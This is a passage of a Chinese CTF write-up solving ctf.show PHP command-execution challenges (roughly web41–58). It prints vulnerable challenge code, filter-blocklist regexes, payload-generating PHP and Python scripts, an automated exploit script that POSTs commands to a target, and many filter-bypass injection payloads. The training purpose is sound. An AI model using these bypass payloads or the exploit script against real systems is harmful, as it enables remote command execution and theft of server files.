class="variable">$i</span>=<span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="number">256</span>; <span class="variable">$i</span>++) &#123; </span><br><span class="line"><span class="keyword">for</span> (<span class="variable">$j</span>=<span class="number">0</span>; <span class="variable">$j</span> &lt;<span class="number">256</span> ; <span class="variable">$j</span>++) &#123; </span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$i</span>&lt;<span class="number">16</span>)&#123;</span><br><span class="line"><span class="variable">$hex_i</span>=<span class="string">&#x27;0&#x27;</span>.<span class="title function_ invoke__">dechex</span>(<span class="variable">$i</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line"><span class="variable">$hex_i</span>=<span class="title function_ invoke__">dechex</span>(<span class="variable">$i</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$j</span>&lt;<span class="number">16</span>)&#123;</span><br><span class="line"><span class="variable">$hex_j</span>=<span class="string">&#x27;0&#x27;</span>.<span class="title function_ invoke__">dechex</span>(<span class="variable">$j</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line"><span class="variable">$hex_j</span>=<span class="title function_ invoke__">dechex</span>(<span class="variable">$j</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$preg</span> = <span class="string">&#x27;/[0-9]|[a-z]|\^|\+|\~|\$|\[|\]|\&#123;|\&#125;|\&amp;|\-/i&#x27;</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="variable">$preg</span> , <span class="title function_ invoke__">hex2bin</span>(<span class="variable">$hex_i</span>))||<span class="title function_ invoke__">preg_match</span>(<span class="variable">$preg</span> , <span class="title function_ invoke__">hex2bin</span>(<span class="variable">$hex_j</span>)))&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  </span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line"><span class="variable">$a</span>=<span class="string">&#x27;%&#x27;</span>.<span class="variable">$hex_i</span>;</span><br><span class="line"><span class="variable">$b</span>=<span class="string">&#x27;%&#x27;</span>.<span class="variable">$hex_j</span>;</span><br><span class="line"><span class="variable">$c</span>=(<span class="title function_ invoke__">urldecode</span>(<span class="variable">$a</span>)|<span class="title function_ invoke__">urldecode</span>(<span class="variable">$b</span>));</span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">ord</span>(<span class="variable">$c</span>)&gt;=<span class="number">32</span>&amp;<span class="title function_ invoke__">ord</span>(<span class="variable">$c</span>)&lt;=<span class="number">126</span>) &#123;</span><br><span class="line"><span class="variable">$contents</span>=<span class="variable">$contents</span>.<span class="variable">$c</span>.<span class="string">&quot; &quot;</span>.<span class="variable">$a</span>.<span class="string">&quot; &quot;</span>.<span class="variable">$b</span>.<span class="string">&quot;\n&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_ invoke__">fwrite</span>(<span class="variable">$myfile</span>,<span class="variable">$contents</span>);</span><br><span class="line"><span class="title function_ invoke__">fclose</span>(<span class="variable">$myfile</span>);</span><br></pre></td></tr></table></figure>也可使用此python脚本能直接构造payload<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line"><span class="keyword">from</span> urllib <span class="keyword">import</span> parse</span><br><span class="line">hex_i = <span class="string">&quot;&quot;</span></span><br><span class="line">hex_j = <span class="string">&quot;&quot;</span></span><br><span class="line">pattern=<span class="string">&#x27;/[0-9]|[a-z]|\^|\+|\~|\$|\[|\]|\&#123;|\&#125;|\&amp;|\-/i&#x27;</span></span><br><span class="line">str1=[<span class="string">&quot;system&quot;</span>,<span class="string">&quot;cat f*&quot;</span>]</span><br><span class="line"><span class="keyword">for</span> p <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2</span>):</span><br><span class="line">    t1 = <span class="string">&quot;&quot;</span></span><br><span class="line">    t2 = <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> k <span class="keyword">in</span> str1[p]:</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">256</span>):</span><br><span class="line">            <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">256</span>):</span><br><span class="line">                <span class="keyword">if</span> re.search(pattern,<span class="built_in">chr</span>(i)) :</span><br><span class="line">                    <span class="keyword">break</span></span><br><span class="line">                <span class="keyword">if</span> re.search(pattern,<span class="built_in">chr</span>(j)) :</span><br><span class="line">                    <span class="keyword">continue</span></span><br><span class="line">                <span class="keyword">if</span> i &lt; <span class="number">16</span>:</span><br><span class="line">                    hex_i = <span class="string">&quot;0&quot;</span> + <span class="built_in">hex</span>(i)[<span class="number">2</span>:]</span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    hex_i=<span class="built_in">hex</span>(i)[<span class="number">2</span>:]</span><br><span class="line">                <span class="keyword">if</span> j &lt; <span class="number">16</span>:</span><br><span class="line">                    hex_j=<span class="string">&quot;0&quot;</span>+<span class="built_in">hex</span>(j)[<span class="number">2</span>:]</span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    hex_j=<span class="built_in">hex</span>(j)[<span class="number">2</span>:]</span><br><span class="line">                hex_i=<span class="string">&#x27;%&#x27;</span>+hex_i</span><br><span class="line">                hex_j=<span class="string">&#x27;%&#x27;</span>+hex_j</span><br><span class="line">                c=<span class="built_in">chr</span>(<span class="built_in">ord</span>(urllib.parse.unquote(hex_i))|<span class="built_in">ord</span>(urllib.parse.unquote(hex_j)))</span><br><span class="line">                <span class="keyword">if</span>(c ==k):</span><br><span class="line">                    t1=t1+hex_i</span><br><span class="line">                    t2=t2+hex_j</span><br><span class="line">                    <span class="keyword">break</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;(\&quot;&quot;</span>+t1+<span class="string">&quot;\&quot;|\&quot;&quot;</span>+t2+<span class="string">&quot;\&quot;)&quot;</span>)</span><br><span class="line"><span class="comment"># (&quot;%13%19%13%14%05%0d&quot;|&quot;%60%60%60%60%60%60&quot;)(&quot;%0c%13&quot;|&quot;%60%60&quot;)</span></span><br></pre></td></tr></table></figure>使用BP传参，用Hackbar会导致二次编码没有回显也可参考羽师傅的全自动脚本<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line"><span class="keyword">from</span> sys <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line">os.system(<span class="string">&quot;C:\Kce_or.php&quot;</span>)  <span class="comment"># 没有将php写入环境变量需手动运行</span></span><br><span class="line"><span class="keyword">if</span> (<span class="built_in">len</span>(argv) != <span class="number">2</span>):</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;=&quot;</span> * <span class="number">50</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;USER：python exp.py &lt;url&gt;&#x27;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;eg：  python exp.py http://ctf.show/&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;=&quot;</span> * <span class="number">50</span>)</span><br><span class="line">    exit(<span class="number">0</span>)</span><br><span class="line">url = argv[<span class="number">1</span>]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">action</span>(<span class="params">arg</span>):</span><br><span class="line">    s1 = <span class="string">&quot;&quot;</span></span><br><span class="line">    s2 = <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> arg:</span><br><span class="line">        f = <span class="built_in">open</span>(<span class="string">r&quot;C:\Kce_or.txt&quot;</span>, <span class="string">&quot;r&quot;</span>)  <span class="comment"># 填txt的文件位置</span></span><br><span class="line">        <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">            t = f.readline()</span><br><span class="line">            <span class="keyword">if</span> t == <span class="string">&quot;&quot;</span>:</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            <span class="keyword">if</span> t[<span class="number">0</span>] == i:</span><br><span class="line">                <span class="comment"># print(i)</span></span><br><span class="line">                s1 += t[<span class="number">2</span>:<span class="number">5</span>]</span><br><span class="line">                s2 += t[<span class="number">6</span>:<span class="number">9</span>]</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">        f.close()</span><br><span class="line">    output = <span class="string">&quot;(\&quot;&quot;</span> + s1 + <span class="string">&quot;\&quot;|\&quot;&quot;</span> + s2 + <span class="string">&quot;\&quot;)&quot;</span></span><br><span class="line">    <span class="keyword">return</span> (output)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    param = action(<span class="built_in">input</span>(<span class="string">&quot;\n[+] your function：&quot;</span>)) + action(<span class="built_in">input</span>(<span class="string">&quot;[+] your command：&quot;</span>))</span><br><span class="line">    data = &#123;</span><br><span class="line">        <span class="string">&#x27;c&#x27;</span>: urllib.parse.unquote(param)</span><br><span class="line">    &#125;</span><br><span class="line">    r = requests.post(url, data=data)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;\n[*] result:\n&quot;</span> + r.text)</span><br></pre></td></tr></table></figure>![非常好用](https://img1.imgtp.com/2023/07/30/byFnEvLS.png)## 42.web42### 题目描述**命令执行，需要严格的过滤**### 解题思路<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="title function_ invoke__">system</span>(<span class="variable">$c</span>.<span class="string">&quot; &gt;/dev/null 2&gt;&amp;1&quot;</span>);</span><br></pre></td></tr></table></figure>是将返回的结果写入黑洞目录中，得不到任何回显我们用双写绕过，用`;`分割，前一个命令正常执行，后一个命令被写入<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?c=ls;ls</span><br><span class="line">?c=tac f*;ls</span><br></pre></td></tr></table></figure>## 43、44.web43、44### 题目描述**命令执行，需要严格的过滤**### 解题思路<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/\;|cat/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        <span class="title function_ invoke__">system</span>(<span class="variable">$c</span>.<span class="string">&quot; &gt;/dev/null 2&gt;&amp;1&quot;</span>);</span><br></pre></td></tr></table></figure>这题比上一题多过滤了`;`、`cat`,但思路不变我们换一种姿势`ls&&`、`tac f*&&`  &&表示前一个指令成功执行的情况下再执行后一个，也起到了分割的作用这里要注意前端会将符号进行一次url解码，需将`&&`编码后传入## 45.web45### 题目描述**命令执行，需要严格的过滤**### 解题思路这题比上一题多过滤了空格，可以考虑使用其他代替如制表符`%09`或`$IFS` 值得注意若使用$IFS代替空格键的话，只能使用通配符*<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/?c=tac$IFS*%26%26</span><br></pre></td></tr></table></figure>## 46、47、48、49.web46、47、48、49### 题目描述**命令执行，需要严格的过滤**### 解题思路<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/\;|cat|flag| |[0-9]|\\$|\*|more|less|head|sort|tail|sed|cut|awk|strings|od|curl|\`/i&quot;</span>, <span class="variable">$c</span>))</span><br></pre></td></tr></table></figure>多过滤了通配符`*`和`$`还有所有数字那以上用$IFS代替空格失效失效，但依然可以用水平制表符%09代替`*`过滤了我们还可以使用通配符？过滤了很多Linux读取命令的函数，发现没有过滤tac<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?c=ls%26%26</span><br><span class="line">?c=tac%09fla?.php%26%26</span><br></pre></td></tr></table></figure>## 50、51.web50、51### 题目描述**命令执行，需要严格的过滤**### 解题思路<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/\;|cat|flag| |[0-9]|\\$|\*|more|less|head|sort|tail|sed|cut|awk|strings|od|curl|\`|\%|\x09|\x26/i&quot;</span>, <span class="variable">$c</span>))</span><br></pre></td></tr></table></figure>将我们常用的水平制表符`%09`和&符号`%26`过滤了&符号我们可以用|替代，但空格难以过滤，因此我们尝试过滤无须空格的命令我们使用nl命令带行号读取，但此方法不支持通配，我们使用shell特性两个单引号分割，中间的自动忽略<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?c=nl&lt;fl&#x27;&#x27;ag.php%7C%7C</span><br></pre></td></tr></table></figure>构造以上payload后查看源代码得到flag## 52.web52### 题目描述**命令执行，需要严格的过滤**### 解题思路这道题过滤了管道符`< >`，但放出了`$`<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/\;|cat|flag| |[0-9]|\*|more|less|head|sort|tail|sed|cut|tac|awk|strings|od|curl|\`|\%|\x09|\x26|\&gt;|\&lt;/i&quot;</span>, <span class="variable">$c</span>))</span><br></pre></td></tr></table></figure>我们可以用复制`cp`或重命名`mv`进行尝试，空格用`${IFS}`绕过首先还是列目录看看`?c=ls||ls`,发现`flag.php`然后将`flag.php`内容拷贝到`a.txt`中，注意过滤数字，要起英文名`?c=cp${IFS}fla?.php${IFS}a.txt||ls`,访问`a.txt`得到`$flag="flag_here"`;很明显是伪造的`flag`，我们用`ls`命令查看根目录<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">?c=ls$&#123;IFS&#125;/||ls </span><br><span class="line">#bin dev etc flag home lib media mnt opt proc root run sbin srv sys tmp usr var</span><br><span class="line"></span><br><span class="line">?c=pwd||ls  </span><br><span class="line"># /var/www/html</span><br><span class="line"></span><br><span class="line">?c=cp$&#123;IFS&#125;/fla?$&#123;IFS&#125;/var/www/html/b.txt||ls</span><br><span class="line"></span><br><span class="line">?c=ls||ls</span><br><span class="line"># a.txt b.txt flag.php index.php</span><br></pre></td></tr></table></figure>按同样方法将根目录下的flag拷贝到当前目录下最后访问b.txt即可## 53.web53### 题目描述**命令执行，需要严格的过滤**### 解题思路<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/\;|cat|flag| |[0-9]|\*|more|wget|less|head|sort|tail|sed|cut|tac|awk|strings|od|curl|\`|\%|\x09|\x26|\&gt;|\&lt;/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        <span class="keyword">echo</span>(<span class="variable">$c</span>);</span><br><span class="line">        <span class="variable">$d</span> = <span class="title function_ invoke__">system</span>(<span class="variable">$c</span>);</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>.<span class="variable">$d</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;no&#x27;</span>;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>> php中system函数会将执行结果最后一行作为返回值返回先`?c=ls`查看文件可以用shell特性绕过过滤`c''at${IFS}fla''g.p''hp`，也可以像上一题一样使用cp命令`?c=cp${IFS}f???.php${IFS}a.txt`## 54.web54### 题目描述**命令执行，需要严格的过滤**### 解题思路<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/\;|.*c.*a.*t.*|.*f.*l.*a.*g.*| |[0-9]|\*|.*m.*o.*r.*e.*|.*w.*g.*e.*t.*|.*l.*e.*s.*s.*|.*h.*e.*a.*d.*|.*s.*o.*r.*t.*|.*t.*a.*i.*l.*|.*s.*e.*d.*|.*c.*u.*t.*|.*t.*a.*c.*|.*a.*w.*k.*|.*s.*t.*r.*i.*n.*g.*s.*|.*o.*d.*|.*c.*u.*r.*l.*|.*n.*l.*|.*s.*c.*p.*|.*r.*m.*|\`|\%|\x09|\x26|\&gt;|\&lt;/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        <span class="title function_ invoke__">system</span>(<span class="variable">$c</span>);</span><br></pre></td></tr></table></figure>可见过滤了很多，而且使用通配符过滤，以上使用单引号截断的方式也失效但经过仔细审查发现没有过滤`mv`重命名指令`?c=mv${IFS}f???????${IFS}a.txt`将flag文件重命名后访问## 55.web55### 题目描述**命令执行，需要严格的过滤**### 解题思路**非预期解**<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 你们在炫技吗？</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/\;|[a-z]|\`|\%|\x09|\x26|\&gt;|\&lt;/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        <span class="title function_ invoke__">system</span>(<span class="variable">$c</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>参考P神博客中的[无数字字母RCE](https://www.leavesongs.com/PENETRATION/webshell-without-alphanum-advanced.html)由于过滤了字母，但没有过滤数字，我们尝试使用/bin目录下的可执行程序。但因为字母不能传入，我们需要使用通配符?来进行代替`?c=/bin/base64 flag.php`替换后变成`?c=/???/????64 ????.???`**预期解**`.`（点）的用法，相当于source，可以执行sh命令在linux里面临时存放文件的目录可能会被定时删除这个目录是/tmp，然后一般网页文件会命名为php???，后面是随机的字母，即：/tmp/phpXXXXXX所以我们需要规定一个范围[@-[],从@-[就是26个字母然后关于上传文件的内容**php生成临时文件名是随机的，最后一个字符不一定是大写字母，不过多尝试几次也就行了**既然要上传的文件能执行内容，所以添加内容/bin/sh因为linux系统下一切皆文件，所以一些个内置程序都是由文件组成的/bin目录下存放的都是协议shell脚本的内容，sh就是执行shell脚本，可以理解为打开终端只有打开终端我们再能输入命令然后就可以在文件里面在添加ls,cat等一系列读取文件的命令了需要构造一个post上传文件的数据包，上传的目的链接要改成题目的链接<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">&quot;en&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">&quot;viewport&quot;</span> <span class="attr">content</span>=<span class="string">&quot;width=device-width, initial-scale=1.0&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>POST数据包POC<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">&quot;http://27622056-3638-418a-95d0-7a217d279e6a.challenge.ctf.show/&quot;</span> <span class="attr">method</span>=<span class="string">&quot;post&quot;</span> <span class="attr">enctype</span>=<span class="string">&quot;multipart/form-data&quot;</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!--链接是当前打开的题目链接--&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">label</span> <span class="attr">for</span>=<span class="string">&quot;file&quot;</span>&gt;</span>文件名：<span class="tag">&lt;/<span class="name">label</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;file&quot;</span> <span class="attr">name</span>=<span class="string">&quot;file&quot;</span> <span class="attr">id</span>=<span class="string">&quot;file&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">name</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">value</span>=<span class="string">&quot;提交&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>然后对该界面进行抓包，选择文件的话随便传一个就行了构造poc(漏洞执行代码)，用来执行命令<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?c=.%20/???/????????[@-[]// %20也可以用+代替</span><br><span class="line">+在这里是一个空格的作用，?是要进行匹配的字符，[@-[]表示@到[之间的字符，这里是包括有所有大写字母</span><br></pre></td></tr></table></figure>然后在bp抓包界面添加sh命令<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">!/bin/sh</span></span><br><span class="line">ls</span><br></pre></td></tr></table></figure>![成功](https://s2.loli.net/2023/08/18/4eaCxELsyTfmv3h.png)## 57.web57### 题目描述**命令执行，需要严格的过滤，已测试，可绕**### 解题思路<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 还能炫的动吗？</span></span><br><span class="line"><span class="comment">//flag in 36.php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/\;|[a-z]|[0-9]|\`|\|\#|\&#x27;|\&quot;|\`|\%|\x09|\x26|\x0a|\&gt;|\&lt;|\.|\,|\?|\*|\-|\=|\[/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        <span class="title function_ invoke__">system</span>(<span class="string">&quot;cat &quot;</span>.<span class="variable">$c</span>.<span class="string">&quot;.php&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>过滤了`、`和`?`，但是放出了`$`，可以通过构造变量的方式绕过查看源码我们只需要构造36即可shell中`$(())`代表做运算返回0，取反则为-1，因此多个相加后再取反可构造出36![成功](https://s2.loli.net/2023/08/20/rAFT5gYGi3te61b.png)payload：<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$((~$(($((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))))))</span><br></pre></td></tr></table></figure>## 58-67.web58-67### 题目描述**命令执行，突破禁用函数**### 解题思路<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 你们在炫技吗？</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">        <span class="variable">$c</span>= <span class="variable">$_POST</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable">$c</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span 